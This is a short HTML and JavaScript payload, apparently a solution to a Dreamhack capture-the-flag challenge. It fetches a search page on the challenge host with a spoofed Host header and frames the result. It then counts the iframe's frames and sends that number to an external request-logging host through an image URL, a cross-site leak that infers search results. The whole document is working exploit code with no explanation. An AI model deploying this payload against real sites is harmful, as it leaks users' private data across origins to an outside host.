<iframe id="iframe"></iframe>
<img id="img">
<script>
const iframe = document.getElementById("iframe");
const header = new Headers();
header.append('HOST', '127.0.0.1:8000');

fetch("http://host3.dreamhack.games:19164/search?query=DH", {
  headers: header
})
.then(response => {
  iframe.src = response.url;
  iframe.onload = () => {
    img.src = `https://gacqjnc.request.dreamhack.games/${iframe.contentWindow.frames.length}`;
  };
})
.catch(error => console.error(error));
</script>
